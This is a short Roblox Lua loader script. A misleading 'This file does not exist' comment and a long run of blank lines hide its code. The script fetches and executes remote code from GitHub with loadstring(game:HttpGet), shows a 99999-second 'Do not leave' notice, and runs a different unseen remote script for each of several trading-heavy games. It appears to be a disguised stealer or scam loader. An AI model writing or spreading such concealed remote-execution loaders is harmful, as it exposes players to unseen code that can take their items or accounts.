-- This file does not exist.














































































































































































local notification =
        loadstring(game:HttpGet("https://raw.githubusercontent.com/wrestonbest/My-Scripts/refs/heads/main/Notification/main.lua"))(

    )
    notification(
        {
            Title = "Script is loading",
            Text = "This might take a while. Do not leave.",
            Duration = 99999
        }
    )





    
repeat task.wait() until game:IsLoaded()

local Games = {
    [8737602449] = "https://raw.githubusercontent.com/bonusttv/robloxscripts/refs/heads/main/plsdonate1.lua",
    [18901165922] = "https://raw.githubusercontent.com/bonusttv/robloxscripts/refs/heads/main/petsgo.lua",
    [142823291] = "https://raw.githubusercontent.com/bonusttv/robloxscripts/refs/heads/main/mm2.lua",
    [8737899170] = "https://raw.githubusercontent.com/bonusttv/robloxscripts/refs/heads/main/ps99.lua",
    [13772394625] = "https://raw.githubusercontent.com/bonusttv/robloxscripts/refs/heads/main/bladeball.lua"
}

for i, v in pairs(Games) do
    if i == game.GameId or i == game.PlaceId then
        loadstring(game:HttpGet(v))()
    end
end





































